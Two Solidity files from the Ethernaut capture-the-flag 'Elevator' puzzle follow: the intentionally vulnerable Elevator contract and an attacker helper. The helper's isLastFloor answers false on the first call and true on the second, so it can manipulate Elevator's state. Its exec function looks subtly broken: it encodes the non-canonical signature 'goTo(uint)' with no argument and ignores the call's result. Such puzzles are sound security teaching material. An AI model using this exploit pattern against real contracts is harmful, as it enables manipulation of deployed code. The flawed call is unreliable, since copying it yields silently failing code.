contracts/Ethernaut/ElevatorHelper.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorHelper is Building {
  bool firstCall = true;
  function isLastFloor(uint floor) external override returns (bool) {
    if(firstCall) {
        firstCall = false;
        return false;
    }
    return true;
  }

  function exec(address elevatorAddr) public {
      elevatorAddr.call(abi.encodeWithSignature("goTo(uint)"));
  }
}

contracts/Ethernaut/Elevator.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

